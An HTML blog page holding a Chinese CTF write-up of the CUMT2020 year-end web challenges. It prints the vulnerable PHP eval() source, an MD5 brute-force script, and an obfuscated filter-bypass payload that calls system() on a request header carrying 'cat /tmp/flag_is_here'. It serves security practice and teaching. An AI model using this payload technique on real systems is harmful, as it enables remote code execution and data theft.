@@ -1,0 +1,981 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="海马少年">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="海马少年">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="WEBEZ_JS  这里有个好用的颜码解码网站：https:&#x2F;&#x2F;www.qtool.net&#x2F;decode">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CUMT2020-岁末赛">
+<meta property="og:url" content="http://example.com/2020/12/30/CUMT2020-%E5%B2%81%E6%9C%AB%E8%B5%9B/index.html">
+<meta property="og:site_name" content="Lcdm123">
+<meta property="og:description" content="WEBEZ_JS  这里有个好用的颜码解码网站：https:&#x2F;&#x2F;www.qtool.net&#x2F;decode">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/12/24/JOxnP3EmolT1ZD2.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/24/bkfDQEdh4cHraju.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/24/gkUB4tPzeCioVv7.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/24/SsHDxGWBlfgIVuL.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/24/XJYx8NE9c2OyiGw.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/24/4weYqknSfE2m5Bz.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/25/S3kCDtJu2KMqgIQ.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/30/Hce1lVCbvQZTKfo.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/S9rz6TGBYxalcdC.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/26/xjLs3Upgi8ctJKY.png">
+<meta property="article:published_time" content="2020-12-30T13:44:22.000Z">
+<meta property="article:modified_time" content="2020-12-30T13:47:13.319Z">
+<meta property="article:author" content="海马少年">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="WriteUp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/12/24/JOxnP3EmolT1ZD2.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>CUMT2020-岁末赛 · 海马少年</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/null" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Lcdm123" type="application/atom+xml">
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >海马少年</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">CUMT2020-岁末赛</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>海马少年</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://i.loli.net/2020/12/22/rBm5oCxN1HZnYb4.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            CUMT2020-岁末赛
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Web">Web</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "WriteUp">WriteUp</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.9k</span>Reading time: <span class="post-count reading-time">17 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/12/30</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a><em>WEB</em></h2><h3 id="EZ-JS"><a href="#EZ-JS" class="headerlink" title="EZ_JS"></a>EZ_JS</h3><p><img src="https://i.loli.net/2020/12/24/JOxnP3EmolT1ZD2.png" alt="image-20201224123233716"></p>
+<p><img src="https://i.loli.net/2020/12/24/bkfDQEdh4cHraju.png" alt="image-20201224123259063"></p>
+<p>这里有个好用的颜码解码网站：<a target="_blank" rel="noopener" href="https://www.qtool.net/decode">https://www.qtool.net/decode</a></p>
+<a id="more"></a>
+
+<h3 id="EZ-RCE"><a href="#EZ-RCE" class="headerlink" title="EZ_RCE"></a>EZ_RCE</h3><p>爆破md5</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000000000000000000</span>):</span><br><span class="line">    i=str(i)</span><br><span class="line">    h=hashlib.md5()</span><br><span class="line">    h.update(i.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    a = h.hexdigest()</span><br><span class="line">    <span class="keyword">if</span>( a[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&quot;7b6db2&quot;</span> ):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"> //<span class="number">2708999</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (substr(md5($_GET[<span class="string">&#x27;pass&#x27;</span>]), <span class="number">0</span>, <span class="number">6</span>) === <span class="string">&quot;7b6db2&quot;</span>) &#123;</span><br><span class="line">        $str = $_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">        $butaixing = [<span class="string">&#x27;[a-z]&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>, <span class="string">&#x27;[\x7f-\xff]&#x27;</span>, <span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;\s&#x27;</span>, <span class="string">&#x27;*&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>, <span class="string">&#x27;\$&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;\^&#x27;</span>, <span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>];</span><br><span class="line">        <span class="comment">// 没过滤 () . ? 数字 &#123;&#125;  / @ -  _</span></span><br><span class="line">        <span class="keyword">foreach</span> ($butaixing <span class="keyword">as</span> $item) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $item . <span class="string">&#x27;/im&#x27;</span>, $str)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;臭弟弟，你想干啥？&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span> . $str . <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这题是 改的RCTF的一题 , 利用一些神奇的操作获得字母</p>
+</blockquote>
+<p>直接给出payload，后期单独总结</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># system(end(getallheaders()))</span><br><span class="line">code &#x3D; ((((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D)).(((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D)))(((((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D)).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))))(((((((1%2F0).(0))%7B0%7D)%7C(((1.1).(0))%7B1%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26(((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D)))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D))%26((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26(((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D)))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))))()))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST &#x2F;?pass&#x3D;2708999 HTTP&#x2F;1.1</span><br><span class="line">Host: 219.219.61.234:50001</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko&#x2F;20100101 Firefox&#x2F;46.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Cookie: PHPSESSID&#x3D;u6qctifmhonae5lp6h3n1e51ot</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 2106</span><br><span class="line">a: cat &#x2F;tmp&#x2F;flag_is_here</span><br><span class="line"></span><br><span class="line">code&#x3D;((((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D)).(((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D)))(((((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D)).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))))(((((((1%2F0).(0))%7B0%7D)%7C(((1.1).(0))%7B1%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26(((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D)))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((4).(0))%7B0%7D))%26((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D))%26((((1%2F0).(0))%7B1%7D)%7C(((1.1).(0))%7B1%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26(((((1%2F0).(0))%7B0%7D)%7C(((0).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D)))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((-10).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((0).(0))%7B0%7D))).(((((1%2F0).(0))%7B0%7D)%7C(((2).(0))%7B0%7D))%26((((1%2F0).(0))%7B2%7D)%7C(((1).(0))%7B0%7D))))()))</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="https://i.loli.net/2020/12/24/gkUB4tPzeCioVv7.png" alt="image-20201224192839797"></p>
+<p><img src="https://i.loli.net/2020/12/24/SsHDxGWBlfgIVuL.png" alt="image-20201224193041277"></p>
+<h3 id="EZ-upload"><a href="#EZ-upload" class="headerlink" title="EZ_upload"></a>EZ_upload</h3><p>扫描目录</p>
+<p><img src="https://i.loli.net/2020/12/24/XJYx8NE9c2OyiGw.png" alt="image-20201224201258096"></p>
+<p>访问可访问的目录</p>
+<p><img src="https://i.loli.net/2020/12/24/4weYqknSfE2m5Bz.png" alt="image-20201224201355301"></p>
+<p>hinit_1</p>
+<p><img src="https://i.loli.net/2020/12/25/S3kCDtJu2KMqgIQ.png" alt="image-20201225143656131"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hint_2  源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Missing something&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$content = $_POST[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">$filename = $_POST[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_string($content) || strlen($content) &gt; <span class="number">125</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;content is too long!!!&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!is_string($filename) || strlen($filename) &gt; <span class="number">10</span>) 